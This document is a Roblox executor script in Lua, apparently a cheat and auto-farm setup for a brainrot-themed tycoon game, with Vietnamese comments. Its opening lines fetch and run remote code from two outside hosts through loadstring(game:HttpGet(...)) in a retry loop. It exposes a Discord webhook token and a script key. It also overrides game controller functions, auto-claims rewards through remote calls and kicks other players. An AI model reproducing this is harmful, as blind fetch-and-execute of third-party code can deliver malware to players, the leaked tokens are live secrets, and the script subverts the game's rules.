spawn(function()
    _G.Config={UserID="af98f8db-b72a-41ad-bfec-3f4182bc93e6",discord_id="1065861794494689402",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/sab"))()end)if s then break end wait(5)end
end)

getgenv().Key = "k848a5227cffb8c1f16c72b2"
getgenv().Config = {
    ["Gameplay"] = {
        ["Server Type"] = "Private (Clone)",
        ["Collect Cash Cap"] = "5000B",
        ["Max Auctioning Multiplier"] = 10,
        ["Lock Base Extra Time"] = 5,
    },
    ["Misc"] = {
        ["Kick if Ping above"] = 1000,
        ["Kick if FPS below"] = 2,
        ["Max Rebirth"] = 9,
        ["Rare Animal Generation"] = "10M",
        ["Only keep Secret if Cash Cap"] = true,
        ["Ignore Secret"] = {},
        ["Auto Fuse"] = {
            ["Enable"] = true,
            ["Fuse Animal"] = "All",
        },
        ["Buy Lucky Block"] = {
            "Secret Lucky Block",
            "Festive Lucky Block",
            "Admin Lucky Block",
            "Taco Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Los Taco Blocks",
        },
        ["Open Lucky Block"] = {
            "Admin Lucky Block",
            "Taco Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Los Taco Blocks",
        },
    },
    ["Performance"] = {
        ["FPS Cap"] = 7,
        ["Black Screen"] = true,
    },
    ["Webhook"] = {
        ["Url"] = "https://discord.com/api/webhooks/1417865473567101069/QZZ0Zql6Y95jct0KQMAQYzxYgmzPexssStT7SQzR6zxatgtNqhGod2FD3HdBOrmAt_TH",
        ["Ignore Notify"] = {
            ["Dul Dul Dul"] = {"All"},
            ["Sammyni Spyderini"] = {"All"},
            ["Extinct Tralalero"] = {"All"},
            ["Chachechi"] = {"All"},
            ["La Cucaracha"] = {"All"},
            ["La Vacca Saturno Saturnita"] = {"All"},
            ["Job Job Job Sahur"] = {"All"},
            ["Los Tralaleritos"] = {"All"},
            ["Las Tralaleritas"] = {"All"},
            ["Zombie Tralala"] = {"All"},
            ["Frankentteo"] = {"All"},
            ["Graipuss Medussi"] = {"All"},
            ["Karkerkar Kurkur"] = {"All"},
            ["To to to Sahur"] = {"All"},
            ["Guerriro Digitale"] = {"All"},
            ["Bisonte Giuppitere"] = {"All"},
            ["Blackhole Goat"] = {"All"},
            ["Coffin Tung Tung Tung Sahur"] = {"All"},
            ["Nooo My Hotspot"] = {"All"},
            ["Perrito Burrito"] = {"All"},
            ["La Grande Combinasion"] = {"All"},
            ["Chicleteira Bicicleteira"] = {"All"},
        },
    },
}

spawn(function() 
    task.wait(30) 
    if not getgenv().scriptLoaded then 
        game.Players.LocalPlayer:Kick("Script load timeout\nKick to prevent animal gets stolen") 
    end 
end)

repeat 
    wait()
    spawn(function()
        loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
    end)
    wait(20)
until getgenv().Joebiden

-- Optimization script
spawn(function()
    task.wait(10)
    
    repeat task.wait(0.3) until game:IsLoaded()
    task.wait(0.5)

    local Players = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local Lighting = game:GetService("Lighting")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local StarterGui = game:GetService("StarterGui")
    local CollectionService = game:GetService("CollectionService")
    local lp = Players.LocalPlayer

    if not lp then
        warn("LocalPlayer not found!")
        return
    end

    pcall(function()
        local userSettings = UserSettings():GetService("UserGameSettings")
        userSettings.SavedQualityLevel = 1
        userSettings.MasterVolume = 0
    end)

    local randomDelay = math.random(0, 200) / 100
    task.wait(randomDelay)

    -- Event cleanup
    task.spawn(function()
        task.wait(0.2)
        
        pcall(function()
            local eventsFolder = Workspace:FindFirstChild("Events")
            if eventsFolder then eventsFolder:Destroy() end
        end)
        
        for _, obj in ipairs(Workspace:GetDescendants()) do
            pcall(function()
                local name = obj.Name:lower()
                if name:find("event") or name:find("stage") or name:find("ufo") or 
                   name:find("meteor") or name:find("shark") or name:find("cave") or
                   name:find("bloodmoon") or name:find("candy") or name:find("molten") or
                   name:find("nyan") or name:find("radioactive") or name:find("rainbow") then
                    obj:Destroy()
                end
            end)
        end
        
        for _, tag in ipairs(CollectionService:GetAllTags()) do
            if tag:lower():find("event") or tag:lower():find("galaxy") or 
               tag:lower():find("trick") or tag:lower():find("witching") or
               tag:lower():find("water") or tag:lower():find("sammyni") then
                for _, obj in ipairs(CollectionService:GetTagged(tag)) do
                    pcall(function() obj:Destroy() end)
                end
            end
        end
        
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
                pcall(function()
                    obj.Enabled = false
                    obj:Destroy()
                end)
            end
        end
    end)

    -- Graphics reduction
    pcall(function()
        Lighting.Technology = Enum.Technology.Compatibility
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 0
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        
        for _, obj in ipairs(Lighting:GetChildren()) do
            if not obj:IsA("Script") and not obj:IsA("LocalScript") and not obj:IsA("ModuleScript") then
                pcall(function() obj:Destroy() end)
            end
        end
    end)

    pcall(function()
        for _, obj in ipairs(game:GetService("MaterialService"):GetChildren()) do
            pcall(function() obj:Destroy() end)
        end
    end)

    -- Particle cleanup
    task.spawn(function()
        local processed = 0
        local maxProcess = 500
        
        for _, v in ipairs(Workspace:GetDescendants()) do
            if processed >= maxProcess then break end
            
            pcall(function()
                if v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                    processed = processed + 1
                elseif v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
                    v.Enabled = false
                    processed = processed + 1
                end
            end)
            
            if processed % 100 == 0 then task.wait() end
        end
    end)

    -- Workspace cleanup
    task.spawn(function()
        task.wait(0.3)
        
        local function clearFolder(parent, name)
            pcall(function()
                local folder = parent:FindFirstChild(name)
                if folder then
                    for _, child in ipairs(folder:GetChildren()) do
                        pcall(function() child:Destroy() end)
                    end
                end
            end)
        end
        
        local function deleteObj(parent, name)
            pcall(function()
                local obj = parent:FindFirstChild(name)
                if obj then obj:Destroy() end
            end)
        end
        
        for _, name in ipairs({"RoadPanel", "Shop", "RobuxShop", "Sounds", "WrappedMachine", "EventBoard", "BrainrotTrader", "AdminBoard", "AdventCalendar", "ShopNPCRobuxIdle"}) do
            deleteObj(Workspace, name)
        end
        
        clearFolder(ReplicatedStorage, "Sounds")
        clearFolder(ReplicatedStorage, "Vfx")
        
        pcall(function()
            local models = ReplicatedStorage:FindFirstChild("Models")
            if models then
                local events = models:FindFirstChild("Events")
                if events then
                    for _, child in ipairs(events:GetChildren()) do
                        pcall(function() child:Destroy() end)
                    end
                end
            end
        end)
        
        pcall(function()
            local map = Workspace:FindFirstChild("Map")
            if map then
                for _, obj in ipairs(map:GetChildren()) do
                    if obj.Name ~= "Ground" and obj.Name ~= "Carpet" then
                        pcall(function() obj:Destroy() end)
                    end
                end
            end
        end)
    end)

    -- GUI cleanup
    task.spawn(function()
        task.wait(0.5)
        
        for _, guiType in ipairs({
            Enum.CoreGuiType.PlayerList,
            Enum.CoreGuiType.Health,
            Enum.CoreGuiType.Backpack,
            Enum.CoreGuiType.Chat,
            Enum.CoreGuiType.EmotesMenu,
        }) do
            pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
        end
        
        pcall(function()
            local camera = Workspace.CurrentCamera
            if camera then
                for _, effect in ipairs(camera:GetChildren()) do
                    if effect:IsA("BlurEffect") or effect:IsA("ColorCorrectionEffect") or
                       effect:IsA("SunRaysEffect") or effect:IsA("BloomEffect") or
                       effect:IsA("DepthOfFieldEffect") then
                        pcall(function() effect:Destroy() end)
                    end
                end
            end
        end)
    end)

    -- Plot detection (giảm timeout)
    task.spawn(function()
        task.wait(0.5)
        
        local plotsFolder = Workspace:FindFirstChild("Plots")
        if not plotsFolder then return end
        
        local plots = plotsFolder:GetChildren()
        
        local function isMyPlot(plot)
            for _, propName in ipairs({"Owner", "UserId", "PlayerName", "ClaimedBy", "PlotOwner"}) do
                local prop = plot:FindFirstChild(propName)
                if prop then
                    local value = prop.Value or prop
                    if tostring(value) == lp.Name or tostring(value) == tostring(lp.UserId) then
                        return true
                    end
                end
            end
            
            for _, attrValue in pairs(plot:GetAttributes()) do
                if tostring(attrValue) == lp.Name or tostring(attrValue) == tostring(lp.UserId) then
                    return true
                end
            end
            
            if lp.Character then
                local hrp = lp.Character:WaitForChild("HumanoidRootPart", 60)
                
                if hrp then
                    local plotPos
                    if plot:IsA("Model") and plot.PrimaryPart then
                        plotPos = plot.PrimaryPart.Position
                    elseif plot:IsA("BasePart") then
                        plotPos = plot.Position
                    end
                    
                    if plotPos and (hrp.Position - plotPos).Magnitude < 100 then
                        return true
                    end
                end
            end
            
            return false
        end
        
        local myPlot = nil
        for _, plot in ipairs(plots) do
            if isMyPlot(plot) then
                myPlot = plot
                break
            end
        end
        
        if myPlot then
            for _, plot in ipairs(plots) do
                if plot ~= myPlot then
                    pcall(function() plot:Destroy() end)
                end
            end
        end
    end)

    -- Event controller hooks
    task.spawn(function()
        task.wait(0.3)
        
        pcall(function()
            local EventController = require(ReplicatedStorage.Controllers.EventController)
            if EventController and type(EventController) == "table" then
                if rawget(EventController, "GetActiveEventData") then
                    rawset(EventController, "GetActiveEventData", function() return nil end)
                end
                if rawget(EventController, "OnStart") then
                    rawset(EventController, "OnStart", function() end)
                end
            end
        end)
    end)

    -- Event listeners
    local lastEventCleanup = 0
    local eventCleanupCooldown = 0.05

    Lighting.ChildAdded:Connect(function(child)
        if tick() - lastEventCleanup < eventCleanupCooldown then return end
        task.spawn(function()
            pcall(function()
                if not child:IsA("Script") and not child:IsA("LocalScript") and not child:IsA("ModuleScript") then
                    child:Destroy()
                    lastEventCleanup = tick()
                end
            end)
        end)
    end)

    Workspace.ChildAdded:Connect(function(child)
        if tick() - lastEventCleanup < eventCleanupCooldown then return end
        task.spawn(function()
            pcall(function()
                local name = child.Name:lower()
                
                local eventKeywords = {
                    "event", "stage", "cave", "meteor", "ufo", "shark", "tung", 
                    "sammyni", "celebration", "particle", "confetti", "firework"
                }
                
                for _, keyword in ipairs(eventKeywords) do
                    if name:find(keyword) then
                        child:Destroy()
                        lastEventCleanup = tick()
                        return
                    end
                end
            end)
        end)
    end)

    -- FPS cap
    task.spawn(function()
        while task.wait(60) do
            pcall(function() setfpscap(7) end)
        end
    end)
end)

-- Advent calendar auto-claim
spawn(function()
    repeat task.wait() until game:IsLoaded()
    task.wait(10)

    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    local success, Sync = pcall(function()
        return require(ReplicatedStorage.Packages.Synchronizer)
    end)
    if not success then return end

    local Calendar = require(ReplicatedStorage.Shared.AdventCalendar)
    local Net = require(ReplicatedStorage.Packages.Net)

    local plrData = Sync:Wait(Players.LocalPlayer)
    if not plrData then return end

    local ClaimFunc = Net:RemoteFunction("AdventService/ClaimReward")
    local cached = {cal = {}, streak = {}}

    local function getCalendar()
        local list = {}
        for i = 1, 25 do
            local status = plrData:Get({"AdventCalendar", "CalendarRewards", tostring(i)})
            if status == "Available" then
                table.insert(list, {day = i, data = Calendar.Rewards.Calendar[i]})
            end
        end
        return list
    end

    local function getStreak()
        local list = {}
        for day, reward in pairs(Calendar.Rewards.Streak) do
            local status = plrData:Get({"AdventCalendar", "StreakRewards", tostring(day)})
            if status == "Available" then
                table.insert(list, {day = day, data = reward})
            end
        end
        return list
    end

    local function check()
        for _, v in ipairs(getCalendar()) do
            if not cached.cal[v.day] then
                pcall(function()
                    ClaimFunc:InvokeServer("Calendar", v.day)
                end)
                cached.cal[v.day] = true
                task.wait(2)
            end
        end
        
        for _, v in ipairs(getStreak()) do
            if not cached.streak[v.day] then
                pcall(function()
                    ClaimFunc:InvokeServer("Streak", v.day)
                end)
                cached.streak[v.day] = true
                task.wait(2)
            end
        end
    end

    check()

    local last = tick()
    RunService.Heartbeat:Connect(function()
        if tick() - last >= 10 then
            last = tick()
            check()
        end
    end)

    plrData:OnChanged({"AdventCalendar", "CalendarRewards"}, check)
    plrData:OnChanged({"AdventCalendar", "StreakRewards"}, check)
end)

-- Anti-leech (kick nếu có người khác join)
spawn(function()
    task.wait(100)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local function instantKick()
        if #Players:GetPlayers() > 1 then
            LocalPlayer:Kick("CÚT")
        end
    end

    instantKick()
    Players.PlayerAdded:Connect(instantKick)
    game:GetService("RunService").Heartbeat:Connect(instantKick)
end)